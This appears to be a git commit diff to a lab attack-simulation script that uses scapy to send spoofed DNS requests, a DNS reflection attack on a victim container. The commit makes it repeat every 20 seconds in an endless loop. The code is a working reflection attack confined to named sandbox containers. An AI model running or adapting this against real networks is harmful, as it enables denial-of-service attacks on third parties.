de48297683690ff1571b1084a05d479e33c14e27
Once-a-deadcat <catgorogoro994@gmail.com>
2023-11-25 21:50:42 +0900

    [modify] baby sandbox

--- attack-simulation/attack-scripts/example-attack-script.py
+++ attack-simulation/attack-scripts/example-attack-script.py
@@ -1,11 +1,14 @@
 # 攻撃シミュレーションスクリプト
 import scapy.all as scapy
 import logging
+import time
 
 # ログ設定
 logging.basicConfig(filename='/var/log/attack-simulation.log', level=logging.INFO)
 
 def dns_reflection_attack():
+  # 20秒に一回攻撃を実行
+  while True:
     # DNSサーバーと偽装された攻撃者IPアドレス
     target_dns = "dns-server"  # DNSサーバーのコンテナ名
     spoofed_ip = "victim-machine"  # 攻撃されるマシンのコンテナ名
@@ -19,5 +22,7 @@ def dns_reflection_attack():
     scapy.send(dns_request, count=100)
     # ログの記録
     logging.info("Attack simulation executed.")
+    # 20秒待つ
+    time.sleep(20)
 
 dns_reflection_attack()
